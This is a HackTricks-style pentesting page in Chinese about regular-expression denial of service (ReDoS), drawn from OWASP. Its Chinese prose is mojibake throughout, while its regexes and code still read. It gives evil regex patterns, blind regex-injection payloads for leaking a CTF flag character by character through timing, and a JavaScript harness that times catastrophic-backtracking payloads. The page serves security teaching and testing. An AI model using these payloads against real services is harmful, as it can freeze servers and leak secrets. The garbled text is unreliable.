# æ­£åˆ™è¡¨è¾¾å¼æ‹’ç»æœåŠ¡ - ReDoS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ PDF æ ¼å¼çš„ HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) æ”¶è—å“ - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## ç®€ä»‹

**æ‘˜è‡ª** [**https://owasp.org/www-community/attacks/Regular\_expression\_Denial\_of\_Service\_-\_ReDoS**](https://owasp.org/www-community/attacks/Regular\_expression\_Denial\_of\_Service\_-\_ReDoS)

**æ­£åˆ™è¡¨è¾¾å¼æ‹’ç»æœåŠ¡ (ReDoS)** æ˜¯ä¸€ç§[æ‹’ç»æœåŠ¡](https://owasp.org/www-community/attacks/Denial\_of\_Service)æ”»å‡»ï¼Œåˆ©ç”¨äº†å¤§å¤šæ•°æ­£åˆ™è¡¨è¾¾å¼å®ç°å¯èƒ½ä¼šå¯¼è‡´å…¶å·¥ä½œéå¸¸ç¼“æ…¢ï¼ˆä¸è¾“å…¥å¤§å°å‘ˆæŒ‡æ•°å…³ç³»ï¼‰çš„äº‹å®ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼çš„ç¨‹åºè¿›å…¥è¿™äº›æç«¯æƒ…å†µï¼Œç„¶åé•¿æ—¶é—´åœé¡¿ã€‚

### æè¿°

#### æœ‰é—®é¢˜çš„æ­£åˆ™è¡¨è¾¾å¼å¤©çœŸç®—æ³• <a href="#the-problematic-regex-naive-algorithm" id="the-problematic-regex-naive-algorithm"></a>

æ­£åˆ™è¡¨è¾¾å¼å¤©çœŸç®—æ³•æ„å»ºäº†ä¸€ä¸ª[éç¡®å®šæœ‰é™è‡ªåŠ¨æœº (NFA)](https://en.wikipedia.org/wiki/Nondeterministic\_finite\_state\_machine)ï¼Œå®ƒæ˜¯ä¸€ä¸ªæœ‰é™çŠ¶æ€æœºï¼Œå¯¹äºæ¯å¯¹çŠ¶æ€å’Œè¾“å…¥ç¬¦å·ï¼Œå¯èƒ½æœ‰å¤šä¸ªå¯èƒ½çš„ä¸‹ä¸€ä¸ªçŠ¶æ€ã€‚ç„¶åå¼•æ“å¼€å§‹è¿›è¡Œè½¬æ¢ï¼Œç›´åˆ°è¾“å…¥ç»“æŸã€‚ç”±äºå¯èƒ½æœ‰å¤šä¸ªå¯èƒ½çš„ä¸‹ä¸€ä¸ªçŠ¶æ€ï¼Œä½¿ç”¨ç¡®å®šæ€§ç®—æ³•ã€‚è¯¥ç®—æ³•é€ä¸ªå°è¯•æ‰€æœ‰å¯èƒ½çš„è·¯å¾„ï¼ˆå¦‚æœéœ€è¦ï¼‰ï¼Œç›´åˆ°æ‰¾åˆ°åŒ¹é…é¡¹ï¼ˆæˆ–å°è¯•å¹¶å¤±è´¥æ‰€æœ‰è·¯å¾„ï¼‰ã€‚

ä¾‹å¦‚ï¼Œæ­£åˆ™è¡¨è¾¾å¼ `^(a+)+$` ç”±ä»¥ä¸‹ NFA è¡¨ç¤ºï¼š

![éç¡®å®šæœ‰é™è‡ªåŠ¨æœº](https://owasp.org/www-community/assets/images/attacks/NFA.png)

å¯¹äºè¾“å…¥ `aaaaX`ï¼Œä¸Šè¿°å›¾ä¸­æœ‰ 16 æ¡å¯èƒ½çš„è·¯å¾„ã€‚ä½†å¯¹äº `aaaaaaaaaaaaaaaaX`ï¼Œæœ‰ 65536 æ¡å¯èƒ½çš„è·¯å¾„ï¼Œå¹¶ä¸”æ¯å¢åŠ ä¸€ä¸ª `a`ï¼Œæ•°é‡å°±ä¼šç¿»å€ã€‚è¿™æ˜¯å¤©çœŸç®—æ³•æœ‰é—®é¢˜çš„ä¸€ä¸ªæç«¯æƒ…å†µï¼Œå› ä¸ºå®ƒå¿…é¡»ç»è¿‡è®¸å¤šè·¯å¾„ï¼Œç„¶åå¤±è´¥ã€‚

è¯·æ³¨æ„ï¼Œå¹¶éæ‰€æœ‰ç®—æ³•éƒ½æ˜¯å¤©çœŸçš„ï¼Œå®é™…ä¸Šï¼Œæ­£åˆ™è¡¨è¾¾å¼ç®—æ³•å¯ä»¥ä»¥é«˜æ•ˆçš„æ–¹å¼ç¼–å†™ã€‚ä¸å¹¸çš„æ˜¯ï¼Œä»Šå¤©å¤§å¤šæ•°æ­£åˆ™è¡¨è¾¾å¼å¼•æ“å°è¯•è§£å†³çš„ä¸ä»…ä»…æ˜¯â€œçº¯ç²¹â€çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿˜åŒ…æ‹¬å¸¦æœ‰â€œç‰¹æ®Šé™„åŠ é¡¹â€çš„â€œæ‰©å±•â€æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¾‹å¦‚ä¸èƒ½å§‹ç»ˆé«˜æ•ˆè§£å†³çš„åå‘å¼•ç”¨ï¼ˆæœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚è§[Wiki-Regex](https://en.wikipedia.org/wiki/Regular\_expression)ä¸­çš„â€œéæ­£åˆ™è¯­è¨€çš„æ¨¡å¼â€ï¼‰ã€‚å› æ­¤ï¼Œå³ä½¿æ­£åˆ™è¡¨è¾¾å¼ä¸æ˜¯â€œæ‰©å±•â€çš„ï¼Œä¹Ÿä¼šä½¿ç”¨å¤©çœŸç®—æ³•ã€‚

#### æ¶æ„æ­£åˆ™è¡¨è¾¾å¼ <a href="#evil-regexes" id="evil-regexes"></a>

å¦‚æœä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¯ä»¥åœ¨ç‰¹å®šè¾“å…¥ä¸Šå¡ä½ï¼Œé‚£ä¹ˆå®ƒè¢«ç§°ä¸ºâ€œæ¶æ„â€æ­£åˆ™è¡¨è¾¾å¼ã€‚

**æ¶æ„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼åŒ…å«**ï¼š

* é‡å¤çš„åˆ†ç»„
* åœ¨é‡å¤çš„åˆ†ç»„å†…éƒ¨ï¼š
* é‡å¤
* é‡å çš„é€‰æ‹©

**æ¶æ„æ¨¡å¼ç¤ºä¾‹**ï¼š

* `(a+)+`
* `([a-zA-Z]+)*`
* `(a|aa)+`
* `(a|a?)+`
* `(.*a){x} for x \> 10`

ä¸Šè¿°æ‰€æœ‰æ¨¡å¼éƒ½å®¹æ˜“å—åˆ°è¾“å…¥ `aaaaaaaaaaaaaaaaaaaaaaaa!` çš„å½±å“ï¼ˆåœ¨ä½¿ç”¨æ›´å¿«æˆ–æ›´æ…¢çš„æœºå™¨æ—¶ï¼Œæœ€å°è¾“å…¥é•¿åº¦å¯èƒ½ä¼šç•¥æœ‰å˜åŒ–ï¼‰ã€‚

## ReDoS è½½è·

### é€šè¿‡ ReDoS è¿›è¡Œå­—ç¬¦ä¸²æ³„éœ²

åœ¨ CTFï¼ˆæˆ–æ¼æ´èµé‡‘ï¼‰ä¸­ï¼Œä¹Ÿè®¸ä½ **æ§åˆ¶äº†ä¸æ•æ„Ÿä¿¡æ¯ï¼ˆæ ‡å¿—ï¼‰åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼**ã€‚ç„¶åï¼Œå¦‚æœ**æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…**ï¼Œè€Œ**ä¸åŒ¹é…åˆ™ä¸åŒ¹é…**ï¼Œä½¿é¡µé¢**å†»ç»“ï¼ˆè¶…æ—¶æˆ–æ›´é•¿çš„å¤„ç†æ—¶é—´ï¼‰**å¯èƒ½ä¼šå¾ˆæœ‰ç”¨ã€‚è¿™æ ·ï¼Œä½ å°±å¯ä»¥**é€ä¸ªå­—ç¬¦åœ°æ³„éœ²**å­—ç¬¦ä¸²ï¼š

* åœ¨[**è¿™ç¯‡æ–‡ç« **](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°è¿™ä¸ª ReDoS è§„åˆ™ï¼š`^(?=<flag>)((.*)*)*salt$`
* ç¤ºä¾‹ï¼š`^(?=HTB{sOmE_flÂ§NÂ§)((.*)*)*salt$`
* åœ¨[**è¿™ç¯‡è§£ç­”**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°è¿™ä¸ªï¼š`<flag>(((((((.*)*)*)*)*)*)*)!`
* åœ¨[**è¿™ç¯‡è§£ç­”**](https://ctftime.org/writeup/25869)ä¸­ï¼Œä»–ä½¿ç”¨äº†ï¼š`^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`
### æ§åˆ¶è¾“å…¥å’Œæ­£åˆ™è¡¨è¾¾å¼çš„ ReDoS

ä»¥ä¸‹æ˜¯ä¸€äº› ReDoS ç¤ºä¾‹ï¼Œæ‚¨å¯ä»¥åŒæ—¶æ§åˆ¶è¾“å…¥å’Œæ­£åˆ™è¡¨è¾¾å¼ï¼š
```javascript
function check_time_regexp(regexp, text){
var t0 = new Date().getTime();;
new RegExp(regexp).test(text);
var t1 = new Date().getTime();;
console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// This payloads work because the input has several "a"s
[
//  "((a+)+)+$",  //Eternal,
//  "(a?){100}$", //Eternal
"(a|a?)+$",
"(\\w*)+$",   //Generic
"(a*)+$",
"(.*a){100}$",
"([a-zA-Z]+)*$", //Generic
"(a+)*$",
].forEach(regexp => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```
## å·¥å…·

* [https://github.com/doyensec/regexploit](https://github.com/doyensec/regexploit)
* [https://devina.io/redos-checker](https://devina.io/redos-checker)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€ä¸ª **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„ **å…¬å¸å¹¿å‘Š** å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
